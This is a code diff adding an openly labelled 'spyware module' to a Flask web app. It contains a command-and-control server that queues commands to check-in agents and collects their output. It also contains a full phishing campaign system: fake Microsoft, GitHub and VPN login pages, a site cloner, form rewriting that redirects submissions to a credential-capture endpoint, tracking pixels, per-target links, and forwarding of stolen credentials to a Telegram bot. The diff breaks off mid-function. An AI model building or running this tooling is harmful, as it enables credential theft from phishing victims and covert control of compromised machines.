@@ -13,6 +13,8 @@ import signal
 import time
 import re
 import logging
+import uuid
+import datetime
 from flask import Flask, render_template, request, jsonify, Response, stream_with_context
 from flask_cors import CORS
 
@@ -307,7 +309,864 @@ def api_interfaces():
     except Exception as e:
         return jsonify({'interfaces': ['eth0', 'wlan0'], 'error': str(e)})
 
+# ═══════════════════════════════════════════════════════════════════════════════
+# ── SPYWARE MODULE — C2 + Phishing ──────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# ── C2 Session Store ──────────────────────────────────────────────────────────
+c2_sessions = {}   # session_id -> session dict
+c2_lock     = threading.Lock()
+
+@app.route('/api/c2/checkin', methods=['POST'])
+def c2_checkin():
+    """Agent HTTP check-in. Returns next queued command (if any)."""
+    data    = request.json or {}
+    sid     = data.get('id') or uuid.uuid4().hex[:8]
+    now_str = datetime.datetime.now().isoformat()
+    with c2_lock:
+        if sid not in c2_sessions:
+            c2_sessions[sid] = {
+                'id':         sid,
+                'hostname':   data.get('hostname', 'unknown'),
+                'ip':         request.remote_addr,
+                'os':         data.get('os', 'unknown'),
+                'user':       data.get('user', 'unknown'),
+                'first_seen': now_str,
+                'last_seen':  now_str,
+                'cmd_queue':  [],
+                'results':    [],
+            }
+        else:
+            c2_sessions[sid]['last_seen'] = now_str
+            c2_sessions[sid]['ip']        = request.remote_addr
+        cmd = None
+        if c2_sessions[sid]['cmd_queue']:
+            cmd = c2_sessions[sid]['cmd_queue'].pop(0)
+    return jsonify({'cmd': cmd, 'session_id': sid})
+
+@app.route('/api/c2/result', methods=['POST'])
+def c2_result():
+    """Agent posts command output."""
+    data = request.json or {}
+    sid  = data.get('session_id', '')
+    with c2_lock:
+        if sid in c2_sessions:
+            c2_sessions[sid]['results'].append({
+                'cmd':    data.get('cmd', ''),
+                'output': data.get('output', ''),
+                'ts':     datetime.datetime.now().isoformat(),
+            })
+            # Keep only last 100 results per session
+            c2_sessions[sid]['results'] = c2_sessions[sid]['results'][-100:]
+    return jsonify({'ok': True})
+
+@app.route('/api/c2/sessions')
+def c2_sessions_api():
+    """List all sessions with alive status."""
+    now = datetime.datetime.now()
+    with c2_lock:
+        result = []
+        for s in c2_sessions.values():
+            ls    = datetime.datetime.fromisoformat(s['last_seen'])
+            alive = (now - ls).total_seconds() < 90
+            result.append({
+                'id':          s['id'],
+                'hostname':    s['hostname'],
+                'ip':          s['ip'],
+                'os':          s['os'],
+                'user':        s['user'],
+                'first_seen':  s['first_seen'],
+                'last_seen':   s['last_seen'],
+                'alive':       alive,
+                'pending_cmds': len(s['cmd_queue']),
+                'results':     s['results'],
+            })
+    return jsonify({'sessions': result})
+
+@app.route('/api/c2/cmd/<session_id>', methods=['POST'])
+def c2_send_cmd(session_id):
+    """Queue a command for a session."""
+    data = request.json or {}
+    cmd  = data.get('cmd', '').strip()
+    if not cmd:
+        return jsonify({'error': 'No command'}), 400
+    ok, reason = sanitize_cmd(cmd)
+    if not ok:
+        return jsonify({'error': reason}), 403
+    with c2_lock:
+        if session_id not in c2_sessions:
+            return jsonify({'error': 'Session not found'}), 404
+        c2_sessions[session_id]['cmd_queue'].append(cmd)
+    return jsonify({'ok': True})
+
+@app.route('/api/c2/kill/<session_id>', methods=['POST'])
+def c2_kill_session(session_id):
+    """Remove a session."""
+    with c2_lock:
+        c2_sessions.pop(session_id, None)
+    return jsonify({'ok': True})
+
+@app.route('/api/c2/clear_results/<session_id>', methods=['POST'])
+def c2_clear_results(session_id):
+    """Clear result history for a session."""
+    with c2_lock:
+        if session_id in c2_sessions:
+            c2_sessions[session_id]['results'] = []
+    return jsonify({'ok': True})
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ── PERSISTENCE ─────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+_DATA_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
+_DATA_FILE = os.path.join(_DATA_DIR, 'state.json')
+os.makedirs(_DATA_DIR, exist_ok=True)
+_save_lock = threading.Lock()
+
+# Telegram config declared here so _save_state can reference it
+_tg_config = {'enabled': False, 'token': '', 'chat_id': ''}
+_tg_lock   = threading.Lock()
+
+def _load_state():
+    """Load persisted state from data/state.json at startup."""
+    if not os.path.isfile(_DATA_FILE):
+        return {}
+    try:
+        with open(_DATA_FILE, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except Exception as e:
+        print('[state] load error:', e)
+        return {}
+
+def _save_state():
+    """Persist mutable state to data/state.json (called after every mutation)."""
+    try:
+        snapshot = {}
+        with phish_lock:
+            snapshot['phish_creds'] = list(phish_creds)
+        with camp_lock:
+            snapshot['campaigns'] = {k: v for k, v in campaigns.items()}
+        with track_lock:
+            snapshot['phish_tracking'] = dict(phish_tracking)
+        with clone_lock:
+            snapshot['cloned_sites'] = {k: {ck: cv for ck, cv in v.items() if ck != 'html'}
+                                         for k, v in cloned_sites.items()}
+        with deploy_lock:
+            snapshot['deployed_pages'] = {k: {dk: dv for dk, dv in v.items() if dk != 'html'}
+                                           for k, v in deployed_pages.items()}
+        with _tg_lock:
+            snapshot['tg_config'] = dict(_tg_config)
+        with _save_lock:
+            tmp = _DATA_FILE + '.tmp'
+            with open(tmp, 'w', encoding='utf-8') as f:
+                json.dump(snapshot, f, indent=2, default=str)
+            os.replace(tmp, _DATA_FILE)
+    except Exception as e:
+        print('[state] save error:', e)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ── PHISHING CAMPAIGN SYSTEM ────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+phish_creds    = []
+phish_lock     = threading.Lock()
+campaigns      = {}          # cid  -> campaign dict
+camp_lock      = threading.Lock()
+phish_tracking = {}          # track_id -> tracking dict
+track_lock     = threading.Lock()
+cloned_sites   = {}          # clone_id -> {html, url, ...}
+clone_lock     = threading.Lock()
+deployed_pages = {}          # page_id  -> {html, name, active, created_at, hits}
+deploy_lock    = threading.Lock()
+_camp_logs     = []          # rolling log (max 500)
+clog_lock      = threading.Lock()
+
+PIXEL_GIF = (
+    b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
+    b'\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
+    b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
+)
+
+def _log_phish(msg, level='info'):
+    entry = {'ts': datetime.datetime.now().isoformat(), 'msg': msg, 'level': level}
+    with clog_lock:
+        _camp_logs.append(entry)
+        if len(_camp_logs) > 500:
+            _camp_logs.pop(0)
+
+def _build_landing(html, track_id, redirect_url):
+    """Inject tracking pixel + override form actions in a phishing page."""
+    import re as _re
+    pixel   = ('<img src="/api/phish/px/' + track_id +
+               '" width="1" height="1" style="position:absolute;opacity:0">')
+    cap_url = '/api/phish/capture?track_id=' + track_id + '&redirect=' + redirect_url
+    html    = _re.sub(r'action\s*=\s*"[^"]*"',
+                      'action="' + cap_url + '"', html, flags=_re.IGNORECASE)
+    html    = _re.sub(r'action\s*=\s*\'[^\']*\'',
+                      "action='" + cap_url + "'", html, flags=_re.IGNORECASE)
+    if '</form>' in html and 'action=' not in html:
+        html = html.replace('</form>', ' action="' + cap_url + '"></form>', 1)
+    html = html.replace('</body>', pixel + '</body>') if '</body>' in html else html + pixel
+    return html
+
+PHISH_TEMPLATES = {
+    'generic': (
+        '<!DOCTYPE html><html><head><title>Login</title>'
+        '<style>*{box-sizing:border-box;margin:0;padding:0}'
+        'body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}'
+        '.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);width:360px}'
+        'h2{text-align:center;margin-bottom:20px;color:#333}'
+        'input{width:100%;padding:10px;margin:6px 0 14px;border:1px solid #ddd;border-radius:4px;font-size:14px}'
+        'button{width:100%;padding:11px;background:#1877f2;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer}'
+        'button:hover{background:#166fe5}'
+        'p{text-align:center;margin-top:14px;font-size:13px;color:#666}</style>'
+        '</head><body><div class="box"><h2>Sign In</h2>'
+        '<form method="POST" action="/api/phish/capture">'
+        '<input name="username" placeholder="Email or Username" required>'
+        '<input name="password" type="password" placeholder="Password" required>'
+        '<button type="submit">Sign In</button></form>'
+        '<p>Forgot password? <a href="#">Reset</a></p></div></body></html>'
+    ),
+    'office365': (
+        '<!DOCTYPE html><html><head><title>Sign in - Microsoft</title>'
+        '<meta name="viewport" content="width=device-width,initial-scale=1">'
+        '<style>*{box-sizing:border-box;margin:0;padding:0}'
+        'body{font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}'
+        '.wrap{width:440px;padding:44px 44px 30px;border:1px solid #ccc;border-radius:2px}'
+        '.logo{font-size:22px;font-weight:600;color:#0078d4;margin-bottom:24px}'
+        'h1{font-size:24px;font-weight:600;margin-bottom:16px;color:#1b1b1b}'
+        'input{width:100%;padding:8px 0;margin-bottom:16px;border:none;border-bottom:1px solid #999;font-size:15px;outline:none;background:transparent}'
+        'input:focus{border-bottom:2px solid #0078d4}'
+        'button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:14px;cursor:pointer;margin-top:8px}'
+        'button:hover{background:#106ebe}'
+        '.foot{font-size:13px;color:#666;margin-top:16px}</style>'
+        '</head><body><div class="wrap"><div class="logo">Microsoft</div><h1>Sign in</h1>'
+        '<form method="POST" action="/api/phish/capture">'
+        '<input name="username" placeholder="Email, phone, or Skype" required>'
+        '<input name="password" type="password" placeholder="Password" required>'
+        '<button type="submit">Sign in</button></form>'
+        '<div class="foot">No account? <a href="#">Create one!</a></div></div></body></html>'
+    ),
+    'github': (
+        '<!DOCTYPE html><html><head><title>Sign in to GitHub</title>'
+        '<style>*{box-sizing:border-box;margin:0;padding:0}'
+        'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f6f8fa}'
+        'header{background:#24292f;padding:16px;text-align:center}'
+        'header span{color:#fff;font-size:24px;font-weight:700;letter-spacing:-1px}'
+        '.wrap{max-width:340px;margin:40px auto}'
+        '.box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px;margin-bottom:16px}'
+        'h1{font-size:24px;font-weight:300;text-align:center;margin-bottom:16px;color:#24292f}'
+        'label{display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#24292f}'
+        'input{width:100%;padding:7px 12px;margin-bottom:12px;border:1px solid #d0d7de;border-radius:6px;font-size:14px}'
+        'button{width:100%;padding:8px;background:#2da44e;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer;font-weight:600}'
+        'button:hover{background:#2c974b}</style>'
+        '</head><body><header><span>GitHub</span></header><div class="wrap"><div class="box">'
+        '<h1>Sign in to GitHub</h1>'
+        '<form method="POST" action="/api/phish/capture">'
+        '<label>Username or email address</label><input name="username" required>'
+        '<label>Password</label><input name="password" type="password" required>'
+        '<button type="submit">Sign in</button></form></div></div></body></html>'
+    ),
+    'vpn': (
+        '<!DOCTYPE html><html><head><title>VPN Portal</title>'
+        '<style>*{box-sizing:border-box;margin:0;padding:0}'
+        'body{font-family:"Segoe UI",sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}'
+        '.card{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:40px;width:380px}'
+        'h2{color:#fff;text-align:center;margin-bottom:8px;font-size:22px}'
+        '.sub{color:rgba(255,255,255,.5);text-align:center;font-size:13px;margin-bottom:28px}'
+        'label{color:rgba(255,255,255,.7);font-size:13px;display:block;margin-bottom:5px}'
+        'input{width:100%;padding:10px 14px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:6px;color:#fff;font-size:14px;margin-bottom:16px;outline:none}'
+        'input:focus{border-color:#4a9eff}'
+        'button{width:100%;padding:12px;background:linear-gradient(90deg,#4a9eff,#0078d4);color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}'
+        '.ico{text-align:center;font-size:40px;margin-bottom:16px}</style>'
+        '</head><body><div class="card"><div class="ico">🔒</div>'
+        '<h2>Corporate VPN</h2><div class="sub">Secure Remote Access Portal</div>'
+        '<form method="POST" action="/api/phish/capture">'
+        '<label>Username</label><input name="username" placeholder="domain\\username" required>'
+        '<label>Password</label><input name="password" type="password" placeholder="••••••••" required>'
+        '<button type="submit">Connect</button></form></div></body></html>'
+    ),
+}
+
+# ── Telegram exfil config ─────────────────────────────────────────────────────
+def _tg_send(text):
+    """Fire-and-forget Telegram message. Runs in a daemon thread."""
+    with _tg_lock:
+        cfg = dict(_tg_config)
+    if not cfg['enabled'] or not cfg['token'] or not cfg['chat_id']:
+        return
+    import urllib.request, urllib.parse
+    def _worker():
+        try:
+            url  = 'https://api.telegram.org/bot' + cfg['token'] + '/sendMessage'
+            body = urllib.parse.urlencode({'chat_id': cfg['chat_id'],
+                                           'text': text[:4096],
+                                           'parse_mode': 'HTML'}).encode()
+            req  = urllib.request.Request(url, data=body, method='POST')
+            urllib.request.urlopen(req, timeout=10)
+        except Exception:
+            pass
+    threading.Thread(target=_worker, daemon=True).start()
+
+@app.route('/api/tg/config', methods=['GET', 'POST'])
+def tg_config():
+    global _tg_config
+    if request.method == 'POST':
+        d = request.json or {}
+        with _tg_lock:
+            if 'token'   in d: _tg_config['token']   = str(d['token'])[:200]
+            if 'chat_id' in d: _tg_config['chat_id']  = str(d['chat_id'])[:50]
+            if 'enabled' in d: _tg_config['enabled']  = bool(d['enabled'])
+        _save_state()
+        return jsonify({'ok': True})
+    with _tg_lock:
+        safe = {'enabled': _tg_config['enabled'],
+                'token_set': bool(_tg_config['token']),
+                'chat_id_set': bool(_tg_config['chat_id'])}
+    return jsonify(safe)
+
+@app.route('/api/tg/test', methods=['POST'])
+def tg_test():
+    _tg_send('<b>\U0001f512 Test</b>\nConexion exitosa desde 404x9.')
+    return jsonify({'ok': True})
+
+# ── Basic creds store (backwards-compat) ──────────────────────────────────────
+@app.route('/api/phish/creds')
+def phish_get_creds():
+    with phish_lock:
+        return jsonify({'creds': list(phish_creds)})
+
+@app.route('/api/phish/clear', methods=['POST'])
+def phish_clear_creds():
+    with phish_lock:
+        phish_creds.clear()
+    _save_state()
+    return jsonify({'ok': True})
+
+@app.route('/api/phish/capture', methods=['GET', 'POST'])
+def phish_capture():
+    """Credential capture endpoint (supports GET + POST). Updates campaign stats."""
+    data         = request.form.to_dict() if request.method == 'POST' else {}
+    data['ip']   = request.remote_addr
+    data['ts']   = datetime.datetime.now().isoformat()
+    data['ua']   = request.headers.get('User-Agent', '')[:200]
+    track_id     = request.args.get('track_id', '')
+    redirect_url = request.args.get('redirect', 'https://google.com')
+
+    if track_id:
+        data['track_id'] = track_id
+        cid = ''
+        with track_lock:
+            tr  = phish_tracking.get(track_id, {})
+            cid = tr.get('campaign_id', '')
+            data['email_target'] = tr.get('email', '')
+            data['name_target']  = tr.get('name', '')
+        if cid:
+            with camp_lock:
+                if cid in campaigns:
+                    campaigns[cid]['stats']['captured'] += 1
+                    for t in campaigns[cid]['targets']:
+                        if t.get('track_id') == track_id:
+                            t['status']   = 'captured'
+                            t['captured'] = {k: v for k, v in data.items()
+                                             if k not in ('ua',)}
+                            break
+        _log_phish('[CAPTURED] ' + data.get('email_target','?') +
+                   ' u=' + data.get('username', data.get('email', '?')) +
+                   ' ip=' + data['ip'], 'crit')
+
+    with phish_lock:
+        phish_creds.append(data)
+    _save_state()
+
+    # Forward to Telegram (server-side, token never exposed to client)
+    def _fmt_tg(d):
+        skip = {'ua', 'ts', 'template', 'track_id'}
+        lines = ['<b>&#127919; CAPTURE</b>  <code>' + d.get('ip','?') + '</code>',
+                 '<b>Page:</b> ' + d.get('page', d.get('template','?')),
+                 '<b>URL:</b> '  + d.get('url', '?')[:120]]
+        for k, v in d.items():
+            if k not in skip and v and k != 'ip':
+                lines.append('<b>' + k + ':</b> <code>' + str(v)[:200] + '</code>')
+        return '\n'.join(lines)
+    _tg_send(_fmt_tg(data))
+
+    return '<script>window.location="' + redirect_url + '"</script>', 200
+
+@app.route('/api/phish/page/<template_name>')
+def phish_page(template_name):
+    """Serve a built-in phishing page (no campaign context)."""
+    tmpl = PHISH_TEMPLATES.get(template_name, PHISH_TEMPLATES['generic'])
+    return tmpl, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+@app.route('/api/phish/templates')
+def phish_templates_api():
+    return jsonify({'templates': list(PHISH_TEMPLATES.keys())})
+
+# ── Tracking Pixel ─────────────────────────────────────────────────────────────
+@app.route('/api/phish/px/<track_id>')
+def phish_pixel(track_id):
+    now = datetime.datetime.now().isoformat()
+    cid = None
+    with track_lock:
+        if track_id in phish_tracking:
+            tr = phish_tracking[track_id]
+            if not tr.get('opened'):
+                tr['opened']  = True
+                tr['open_ts'] = now
+                tr['open_ip'] = request.remote_addr
+                tr['open_ua'] = request.headers.get('User-Agent', '')[:200]
+            cid = tr.get('campaign_id')
+    if cid:
+        with camp_lock:
+            if cid in campaigns:
+                campaigns[cid]['stats']['opened'] += 1
+                for t in campaigns[cid]['targets']:
+                    if t.get('track_id') == track_id and t['status'] in ('sent', 'pending'):
+                        t['status']  = 'opened'
+                        t['open_ts'] = now
+                        t['open_ip'] = request.remote_addr
+                        break
+    _log_phish('[OPEN] track=' + track_id[:8] + ' ip=' + request.remote_addr, 'ok')
+    return PIXEL_GIF, 200, {
+        'Content-Type': 'image/gif',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'X-Content-Type-Options': 'nosniff'
+    }
+
+# ── Landing Page ───────────────────────────────────────────────────────────────
+@app.route('/api/phish/land/<track_id>')
+def phish_landing(track_id):
+    """Serve personalised phishing page for a tracked target."""
+    now          = datetime.datetime.now().isoformat()
+    cid          = ''
+    redirect_url = 'https://google.com'
+    with track_lock:
+        tr  = phish_tracking.get(track_id, {})
+        cid = tr.get('campaign_id', '')
+
+    html = ''
+    with camp_lock:
+        camp = campaigns.get(cid, {})
+        redirect_url = camp.get('redirect_url', 'https://google.com')
+        clone_id     = camp.get('clone_id', '')
+        tmpl_name    = camp.get('template', 'generic')
+        custom       = camp.get('custom_html', '')
+        if cid in campaigns:
+            campaigns[cid]['stats']['clicked'] += 1
+            for t in campaigns[cid]['targets']:
+                if t.get('track_id') == track_id:
+                    if t['status'] in ('sent', 'opened', 'pending'):
+                        t['status'] = 'clicked'
+                    t['click_ts'] = now
+                    break
+
+    if clone_id:
+        with clone_lock:
+            c    = cloned_sites.get(clone_id, {})
+            html = c.get('html', '')
+    if not html and custom:
+        html = custom
+    if not html:
+        html = PHISH_TEMPLATES.get(tmpl_name, PHISH_TEMPLATES['generic'])
+
+    # Variable substitution
+    with track_lock:
+        tr = phish_tracking.get(track_id, {})
+    html = html.replace('{{email}}', tr.get('email', ''))
+    html = html.replace('{{name}}',  tr.get('name',  ''))
+    html = html.replace('{{track_id}}', track_id)
+
+    html = _build_landing(html, track_id, redirect_url)
+    _log_phish('[CLICK] track=' + track_id[:8] + ' ip=' + request.remote_addr, 'warn')
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+# ── Campaign CRUD ──────────────────────────────────────────────────────────────
+@app.route('/api/campaign/create', methods=['POST'])
+def campaign_create():
+    data = request.json or {}
+    cid  = uuid.uuid4().hex[:8]
+    now  = datetime.datetime.now().isoformat()
+    camp = {
+        'id': cid,
+        'name':         data.get('name', 'Campaign-' + cid[:4]),
+        'status':       'created',
+        'template':     data.get('template', 'generic'),
+        'custom_html':  data.get('custom_html', ''),
+        'clone_id':     data.get('clone_id', ''),
+        'redirect_url': data.get('redirect_url', 'https://google.com'),
+        'smtp_host':    data.get('smtp_host', ''),
+        'smtp_port':    data.get('smtp_port', '25'),
+        'smtp_user':    data.get('smtp_user', ''),
+        'smtp_pass':    data.get('smtp_pass', ''),
+        'smtp_tls':     data.get('smtp_tls', False),
+        'from_name':    data.get('from_name', 'IT Support'),
+        'from_email':   data.get('from_email', ''),
+        'subject':      data.get('subject', 'Action Required'),
+        'email_body':   data.get('email_body', ''),
+        'targets':      [],
+        'created_at':   now,
+        'started_at':   None,
+        'stopped_at':   None,
+        'stats': {'total': 0, 'sent': 0, 'opened': 0, 'clicked': 0, 'captured': 0},
+    }
+    with camp_lock:
+        campaigns[cid] = camp
+    _log_phish('Campaign created: ' + camp['name'] + ' [' + cid + ']')
+    return jsonify({'id': cid, 'campaign': camp})
+
+@app.route('/api/campaign/list')
+def campaign_list():
+    with camp_lock:
+        return jsonify({'campaigns': list(campaigns.values())})
+
+@app.route('/api/campaign/<cid>', methods=['GET'])
+def campaign_get(cid):
+    with camp_lock:
+        c = campaigns.get(cid)
+    if not c:
+        return jsonify({'error': 'Not found'}), 404
+    return jsonify(c)
+
+@app.route('/api/campaign/<cid>', methods=['DELETE'])
+def campaign_delete(cid):
+    with camp_lock:
+        c = campaigns.pop(cid, None)
+    if c:
+        _log_phish('Campaign deleted: ' + (c.get('name') or cid))
+    return jsonify({'ok': True})
+
+@app.route('/api/campaign/<cid>/update', methods=['POST'])
+def campaign_update(cid):
+    data = request.json or {}
+    fields = ('name','template','custom_html','clone_id','redirect_url',
+              'smtp_host','smtp_port','smtp_user','smtp_pass','smtp_tls',
+              'from_name','from_email','subject','email_body')
+    with camp_lock:
+        if cid not in campaigns:
+            return jsonify({'error': 'Not found'}), 404
+        for k in fields:
+            if k in data:
+                campaigns[cid][k] = data[k]
+    return jsonify({'ok': True})
+
+@app.route('/api/campaign/<cid>/start', methods=['POST'])
+def campaign_start(cid):
+    now = datetime.datetime.now().isoformat()
+    with camp_lock:
+        if cid not in campaigns:
+            return jsonify({'error': 'Not found'}), 404
+        campaigns[cid]['status']     = 'running'
+        campaigns[cid]['started_at'] = now
+        name = campaigns[cid]['name']
+    _log_phish('Campaign started: ' + name, 'ok')
+    return jsonify({'ok': True})
+
+@app.route('/api/campaign/<cid>/stop', methods=['POST'])
+def campaign_stop(cid):
+    now = datetime.datetime.now().isoformat()
+    with camp_lock:
+        if cid not in campaigns:
+            return jsonify({'error': 'Not found'}), 404
+        campaigns[cid]['status']     = 'stopped'
+        campaigns[cid]['stopped_at'] = now
+        name = campaigns[cid]['name']
+    _log_phish('Campaign stopped: ' + name, 'warn')
+    return jsonify({'ok': True})
+
+# ── Target Management ──────────────────────────────────────────────────────────
+@app.route('/api/campaign/<cid>/targets/add', methods=['POST'])
+def campaign_add_targets(cid):
+    data    = request.json or {}
+    targets = data.get('targets', [])
+    added   = []
+    with camp_lock:
+        if cid not in campaigns:
+            return jsonify({'error': 'Not found'}), 404
+        for t in targets:
+            email = (t.get('email') or '').strip()
+            if not email:
+                continue
+            tid    = uuid.uuid4().hex[:12]
+            target = {
+                'id':       tid,
+                'email':    email,
+                'name':     (t.get('name') or email.split('@')[0]),
+                'status':   'pending',
+                'track_id': tid,
+                'sent_at':  None, 'open_ts': None, 'open_ip': None,
+                'open_ua':  None, 'click_ts': None, 'captured': None,
+            }
+            campaigns[cid]['targets'].append(target)
+            campaigns[cid]['stats']['total'] += 1
+            added.append(target)
+    with track_lock:
+        for t in added:
+            phish_tracking[t['track_id']] = {
+                'campaign_id': cid,
+                'target_id':   t['id'],
+                'email':       t['email'],
+                'name':        t['name'],
+                'opened':      False,
+                'open_ts':     None,
+                'open_ip':     None,
+                'open_ua':     None,
+            }
+    _log_phish('Added ' + str(len(added)) + ' targets to [' + cid + ']')
+    return jsonify({'added': len(added)})
+
+@app.route('/api/campaign/<cid>/targets/clear', methods=['POST'])
+def campaign_clear_targets(cid):
+    with camp_lock:
+        if cid not in campaigns:
+            return jsonify({'error': 'Not found'}), 404
+        old = len(campaigns[cid]['targets'])
+        campaigns[cid]['targets'] = []
+        campaigns[cid]['stats']   = {'total': 0, 'sent': 0, 'opened': 0, 'clicked': 0, 'captured': 0}
+    return jsonify({'cleared': old})
+
+@app.route('/api/campaign/<cid>/target/<tid>/sent', methods=['POST'])
+def target_mark_sent(cid, tid):
+    now = datetime.datetime.now().isoformat()
+    with camp_lock:
+        if cid in campaigns:
+            for t in campaigns[cid]['targets']:
+                if t['id'] == tid and t['status'] == 'pending':
+                    t['status']  = 'sent'
+                    t['sent_at'] = now
+                    campaigns[cid]['stats']['sent'] += 1
+                    break
+    return jsonify({'ok': True})
+
+# ── Tracker & Logs ─────────────────────────────────────────────────────────────
+@app.route('/api/campaign/tracker')
+def campaign_tracker():
+    """All targets across campaigns, sorted by most recent activity."""
+    result = []
+    with camp_lock:
+        for camp in campaigns.values():
+            host = request.host or 'localhost:5000'
+            for t in camp.get('targets', []):
+                result.append({
+                    'campaign_id':     camp['id'],
+                    'campaign_name':   camp['name'],
+                    'campaign_status': camp['status'],
+                    'email':    t['email'],
+                    'name':     t['name'],
+                    'status':   t['status'],
+                    'track_id': t.get('track_id', ''),
+                    'sent_at':  t.get('sent_at'),
+                    'open_ts':  t.get('open_ts'),
+                    'open_ip':  t.get('open_ip'),
+                    'click_ts': t.get('click_ts'),
+                    'captured': t.get('captured') is not None,
+                    'link': 'http://' + host + '/api/phish/land/' + t.get('track_id', ''),
+                })
+    result.sort(
+        key=lambda x: x.get('click_ts') or x.get('open_ts') or x.get('sent_at') or '',
+        reverse=True
+    )
+    return jsonify({'targets': result})
+
+@app.route('/api/phish/logs')
+def phish_logs():
+    since = request.args.get('since', '')
+    with clog_lock:
+        logs = [l for l in _camp_logs if (not since or l['ts'] > since)]
+    return jsonify({'logs': logs[-200:]})
+
+# ── Site Cloner ────────────────────────────────────────────────────────────────
+@app.route('/api/phish/clone_site', methods=['POST'])
+def phish_clone_site():
+    data = request.json or {}
+    url  = (data.get('url') or '').strip()
+    if not url:
+        return jsonify({'error': 'No URL provided'}), 400
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    try:
+        import urllib.request as _ur
+        import urllib.parse   as _up
+        import re as _re
+        req = _ur.Request(url, headers={
+            'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept':          'text/html,application/xhtml+xml,*/*;q=0.9',
+            'Accept-Language': 'en-US,en;q=0.9',
+        })
+        with _ur.urlopen(req, timeout=15) as resp:
+            final_url = resp.url
+            raw       = resp.read(5_000_000)   # max 5 MB
+
+        try:
+            html = raw.decode('utf-8')
+        except UnicodeDecodeError:
+            html = raw.decode('latin-1', errors='replace')
+
+        parsed = _up.urlparse(final_url)
+        base   = parsed.scheme + '://' + parsed.netloc
+
+        # Make relative paths absolute
+        html = _re.sub(r'((?:href|src|action)=")(/[^"]*)',
+                       lambda m: m.group(1) + base + m.group(2), html)
+        html = _re.sub(r"((?:href|src|action)=')(/[^']*)",
+                       lambda m: m.group(1) + base + m.group(2), html)
+        # Protocol-relative
+        html = _re.sub(r'((?:href|src)=")(//)',
+                       lambda m: m.group(1) + parsed.scheme + ':', html)
+
+        clone_id = uuid.uuid4().hex[:8]
+        with clone_lock:
+            cloned_sites[clone_id] = {
+                'id':         clone_id,
+                'url':        final_url,
+                'html':       html,
+                'size':       len(html),
+                'created_at': datetime.datetime.now().isoformat(),
+            }
+        _log_phish('Cloned: ' + final_url + ' [' + clone_id + '] ' + str(len(html)) + 'B', 'ok')
+        return jsonify({'clone_id': clone_id, 'url': final_url, 'size': len(html)})
+    except Exception as e:
+        _log_phish('Clone failed: ' + url + ' — ' + str(e), 'err')
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/phish/clones')
+def phish_clones():
+    with clone_lock:
+        result = [{'id': c['id'], 'url': c['url'], 'size': c['size'], 'created_at': c['created_at']}
+                  for c in cloned_sites.values()]
+    return jsonify({'clones': result})
+
+@app.route('/api/phish/clone/<clone_id>/preview')
+def phish_clone_preview(clone_id):
+    with clone_lock:
+        c = cloned_sites.get(clone_id)
+    if not c:
+        return 'Clone not found', 404
+    return c['html'], 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+
+# ── Quick-deploy pages  (/p/<id>) ─────────────────────────────────────────────
+@app.route('/api/phish/deploy', methods=['POST'])
+def phish_deploy():
+    """Store an HTML page and return a clean public URL (/p/<id>)."""
+    data    = request.json or {}
+    html    = data.get('html', '').strip()
+    name    = data.get('name', 'page')[:80]
+    if not html:
+        return jsonify({'error': 'html required'}), 400
+    page_id = uuid.uuid4().hex[:8]
+    now     = datetime.datetime.now().isoformat()
+    redirect_url = data.get('redirect_url', '').strip() or 'https://google.com'
+    with deploy_lock:
+        deployed_pages[page_id] = {
+            'html':         html,
+            'name':         name,
+            'active':       True,
+            'created_at':   now,
+            'hits':         0,
+            'redirect_url': redirect_url,
+        }
+    _log_phish('[DEPLOY] id=' + page_id + ' name=' + name, 'info')
+    _save_state()
+    return jsonify({'id': page_id, 'url': '/p/' + page_id})
+
+@app.route('/api/phish/deploy/<page_id>', methods=['POST'])
+def phish_deploy_stop(page_id):
+    """Toggle active state of a deployed page."""
+    data = request.json or {}
+    with deploy_lock:
+        if page_id not in deployed_pages:
+            return jsonify({'error': 'not found'}), 404
+        deployed_pages[page_id]['active'] = data.get('active', False)
+    _save_state()
+    return jsonify({'ok': True})
+
+@app.route('/p/<page_id>', methods=['GET', 'POST'])
+def serve_deployed_page(page_id):
+    """Serve a quick-deployed phishing page and capture any form submissions."""
+    with deploy_lock:
+        page = deployed_pages.get(page_id)
+    if not page:
+        return 'Not found', 404
+    if not page.get('active', True):
+        return 'This page is no longer available.', 410
+
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ua = request.headers.get('User-Agent', '')[:120]
+
